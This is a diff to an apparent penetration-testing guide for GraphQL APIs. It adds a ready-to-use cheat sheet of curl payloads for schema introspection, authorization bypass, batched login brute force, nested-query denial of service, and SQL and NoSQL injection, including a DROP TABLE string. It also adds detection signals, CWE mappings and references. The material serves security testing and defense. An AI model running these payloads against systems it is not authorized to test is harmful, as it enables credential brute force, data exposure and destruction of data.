@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [api, rest, graphql, soap, wstg, apit]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-apit-00, wstg-apit-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-apit-01: "GraphQL introspection combined with recon exposure hands the attacker a complete, auto-documented schema of every query/mutation/type — eliminating the need for endpoint fuzzing and speeding discovery of hidden/admin-only operations (High)"
 ---
 
 # wstg-apit-99
@@ -279,6 +280,86 @@ tester.generate_report()
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use GraphQL Cheat Sheet
+
+```bash
+GQL="https://{target}/graphql"
+
+# Full introspection dump (types, fields, mutations)
+curl -s -X POST "$GQL" -H "Content-Type: application/json" \
+    -d '{"query": "{ __schema { types { name fields { name type { name } } } } } "}' | jq '.'
+
+# List only queries/mutations for a quick attack-surface overview
+curl -s -X POST "$GQL" -H "Content-Type: application/json" \
+    -d '{"query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' | jq '.'
+
+# Field-level authorization bypass — try an admin-only field with a low-priv token
+curl -s -X POST "$GQL" -H "Authorization: Bearer $LOW_PRIV_TOKEN" -H "Content-Type: application/json" \
+    -d '{"query": "{ admin { secrets users { id email } } }"}'
+
+# Batching attack — brute-force multiple logins in a single request
+curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{
+  "query": "query { q1: login(email:\"a@test.com\",password:\"pass1\"){token} q2: login(email:\"a@test.com\",password:\"pass2\"){token} q3: login(email:\"a@test.com\",password:\"pass3\"){token} }"
+}'
+
+# Deep nested query for DoS / missing depth-limit check
+python3 -c "
+depth = 15
+q = '{ users ' + '{ friends ' * depth + '{ id } ' + '} ' * depth + '}'
+print(q)
+" > deep_query.txt
+curl -s -X POST "$GQL" -H "Content-Type: application/json" \
+    -d "{\"query\": \"$(cat deep_query.txt)\"}"
+
+# Injection via string arguments
+for p in '1 OR 1=1' "1'; DROP TABLE users--" '${7*7}' '{{7*7}}'; do
+  curl -s -X POST "$GQL" -H "Content-Type: application/json" \
+    -d "{\"query\": \"{ user(id: \\\"$p\\\") { id } }\"}"
+done
+
+# GraphQL Voyager / InQL for schema visualization (via Burp extension) or CLI
+graphql-cop -t "$GQL"
+
+# GET-based injection point (spec allows GET; some WAFs/filters only cover POST)
+curl -s "$GQL?query={__schema{types{name}}}"
+curl -s "$GQL?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D"
+
+# Error-based schema enumeration when introspection is disabled — GraphQL "did you
+# mean" suggestions leak field/type names one guess at a time
+curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}'
+# -> "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"
+
+# Bypass disabled introspection entirely by reconstructing the schema from error
+# suggestions (clairvoyancex) or fingerprint the GraphQL engine first (graphw00f)
+# graphw00f -d -f -t "$GQL"
+# clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "$GQL"
+
+# JSON-list based batching (array of operations in one HTTP request)
+curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '[{"query":"{ q1: login(email:\"a@test.com\",password:\"p1\"){token} }"},{"query":"{ q2: login(email:\"a@test.com\",password:\"p2\"){token} }"}]'
+
+# NoSQL injection via $regex inside a string/search argument (MongoDB-backed resolvers)
+curl -s -X POST "$GQL" -H "Content-Type: application/json" -d '{
+  "query": "{ users(search: \"{ \\\"email\\\": { \\\"$regex\\\": \\\".*\\\" } }\") { id email } }"
+}'
+
+# Brute-force / fuzz mutations with CrackQL (handles GraphQL-specific rate-limit quirks)
+# crackql -u "$GQL" -f mutation_login.json -w passwords.txt
+```
+
+### Detection Patterns
+
+| Signal                                          | Meaning                          |
+| ---------------------------------------------------| ------------------------------------ |
+| `__schema` resolves without auth                    | Introspection enabled in production  |
+| Admin/privileged field resolves with low-priv token   | Missing field-level authorization    |
+| All aliased batch mutations execute in one request    | No batching limit — brute-force enabler |
+| Deeply nested query returns data instead of an error   | No query depth/complexity limiting  |
+| SQL/template error text in response                    | Injection via GraphQL argument      |
+
+---
+
 ## Remediation
 
 ```python
@@ -308,6 +389,26 @@ schema.execute(query, validation_rules=[depth_limit_validator(5)])
 | Authorization bypass  | 7.5  | High     |
 | SQL injection         | 9.8  | Critical |
 
+---
+
+## CWE Categories
+
+| CWE ID | Title | Description |
+| --- | --- | --- |
+| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | Schema/type disclosure via introspection |
+| **CWE-285** | Improper Authorization | Missing field/type-level authorization checks |
+| **CWE-770** | Allocation of Resources Without Limits or Throttling | No query depth/complexity limit or batching cap — DoS |
+| **CWE-89** | SQL Injection | Unsanitized string arguments passed to resolvers |
+
+---
+
+## References
+
+- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
+- [OWASP API Security Top 10](https://owasp.org/API-Security/)
+- [graphql-cop - GraphQL Security Auditor](https://github.com/dolevf/graphql-cop)
+- [PortSwigger - GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
+- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
 
 ---
 
